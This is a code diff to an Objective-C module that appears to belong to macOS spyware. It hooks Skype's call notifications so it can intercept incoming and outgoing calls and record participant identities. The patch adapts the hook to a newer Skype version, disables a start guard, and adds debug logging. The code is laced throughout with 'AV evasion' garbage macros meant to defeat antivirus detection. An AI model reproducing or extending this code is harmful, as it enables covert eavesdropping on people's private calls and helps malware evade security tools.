@@ -1261,6 +1261,10 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
   // AV evasion: only on release build
   AV_GARBAGE_006
   
+#ifdef DEBUG_VOIP_SKYPE
+  infoLog(@"Hooked with arg: %@", arg1);
+#endif
+  
   //NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   NSString *name = [arg1 name];
   BOOL shouldStart = NO;
@@ -1272,7 +1276,8 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
   // Do this as fast as we can
   // So say we all
   //
-  if ([name isEqualToString: @"CallConnecting"])
+  // XXX- versione 6.1x:
+  if ([[arg1 name] isEqualToString: @"OutgoingCall"])//[name isEqualToString: @"CallConnecting"])
   { 
     // AV evasion: only on release build
     AV_GARBAGE_002
@@ -1290,12 +1295,14 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  [self handleNotificationHook: arg1];
-  
   // AV evasion: only on release build
   AV_GARBAGE_006
   
-  if ([[arg1 name] isEqualToString: @"CallConnecting"]   // CallTo
+#ifdef DEBUG_VOIP_SKYPE
+  infoLog(@"Hooked with arg name: %@", [arg1 name]);
+#endif
+  // XXX- versione 6.1x:
+  if ([[arg1 name] isEqualToString: @"OutgoingCall"] // [[arg1 name] isEqualToString: @"CallConnecting"]   // CallTo
       || [[arg1 name] isEqualToString: @"IncomingCall"]) // IncomingCall
   {
     // AV evasion: only on release build
@@ -1307,7 +1314,8 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
     //temp = gIsSkypeVoipAgentActive;
     //[agentLock unlock];
     
-    if (shouldStart == YES)
+    // XXX- versione 6.1x:
+    //if (shouldStart == YES)
     {     
       // AV evasion: only on release build
       AV_GARBAGE_004
@@ -1337,13 +1345,18 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
       // [arg1 object] == SKConversation object
       id conversation = [arg1 object];
       
+#ifdef DEBUG_VOIP_SKYPE
+      infoLog(@"conversation: %@", conversation);
+#endif
       // AV evasion: only on release build
       AV_GARBAGE_003
       
       if ([conversation respondsToSelector: @selector(participants)])
       {
         NSArray *participants = [conversation performSelector: @selector(participants)];
-        
+#ifdef DEBUG_VOIP_SKYPE
+        infoLog(@"Participants: %@", participants);
+#endif
         // AV evasion: only on release build
         AV_GARBAGE_009
         
@@ -1367,13 +1380,18 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
             AV_GARBAGE_009
             
             id participant = [conversation performSelector: @selector(myself)];
+#ifdef DEBUG_VOIP_SKYPE
+            infoLog(@"participant: %@", participant);
+#endif
             if ([participant respondsToSelector: @selector(identity)])
             { 
               // AV evasion: only on release build
               AV_GARBAGE_001
               
               peer = [participant performSelector: @selector(identity)];
-              
+#ifdef DEBUG_VOIP_SKYPE
+              infoLog(@"peer: %@", peer);
+#endif
               // AV evasion: only on release build
               AV_GARBAGE_002              
             }
@@ -1466,6 +1484,8 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
   
   // AV evasion: only on release build
   AV_GARBAGE_006
+  
+  [self handleNotificationHook: arg1];
   
   //[outerPool release];
 }
